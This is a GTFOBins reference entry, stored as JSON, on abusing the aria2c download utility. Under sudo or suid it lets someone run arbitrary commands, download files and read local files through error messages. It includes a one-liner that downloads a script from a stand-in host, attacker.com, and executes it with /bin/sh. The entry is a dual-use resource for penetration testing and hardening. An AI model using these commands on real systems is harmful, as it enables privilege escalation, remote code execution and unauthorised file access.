{"title": "aria2c", "source": "gtfobins", "source_label": "GTFOBins", "path": "aria2c", "html": "<h1>aria2c</h1>\n<h2>Command Execution</h2>\n<p>Note that the subprocess is immediately sent to the background.</p>\n<pre><code class=\"language-bash\">echo /path/to/command &gt;/path/to/temp-file\nchmod +x /path/to/temp-file\naria2c --on-download-error=/path/to/temp-file http://some-invalid-domain</code></pre>\n<p>The remote file `aaaaaaaaaaaaaaaa` (must be a string of 16 hex digit) contains the shell script, e.g., `/path/to/command`. Note that said file needs to be written on disk in order to be executed. `--allow-overwrite` is needed if this is executed multiple times with the same GID.</p>\n<pre><code class=\"language-bash\">aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh http://attacker.com/aaaaaaaaaaaaaaaa</code></pre>\n<h2>Download</h2>\n<p>Use `--allow-overwrite` if needed. Similarly `-o /path/to/ouput-file` can be omitted, in that case the file is saved to `input-file` in the current working directory.</p>\n<pre><code class=\"language-bash\">aria2c -o /path/to/ouput-file http://attacker.com/path/to/input-file</code></pre>\n<h2>File Read</h2>\n<p>The file is leaked as error messages.</p>\n<pre><code class=\"language-bash\">aria2c -i /path/to/input-file</code></pre>", "excerpt": "aria2c Command Execution Note that the subprocess is immediately sent to the background. echo /path/to/command &gt;/path/to/temp-file chmod +x /path/to/temp-file aria2c --on-download-error=/path/to/temp-file http://some-invalid-domain The remote…", "tags": ["func:command", "func:download", "func:file-read", "ctx:sudo", "ctx:suid", "ctx:unprivileged"]}